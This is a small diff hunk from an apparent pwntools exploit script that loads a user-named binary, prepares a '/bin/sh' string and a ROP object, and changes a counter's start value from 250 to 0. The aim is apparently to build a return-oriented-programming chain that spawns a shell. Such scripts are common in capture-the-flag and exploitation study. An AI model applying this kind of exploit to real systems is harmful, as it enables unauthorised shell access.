@@ -3,7 +3,7 @@ from pwn import*
 
 binary_name = raw_input('binary name : ').rstrip('\n')
 binsh = '/bin/sh\x00'
-i = 250
+i = 0
 
 elf_data = ELF('./'+binary_name)
 rop = ROP(elf_data)
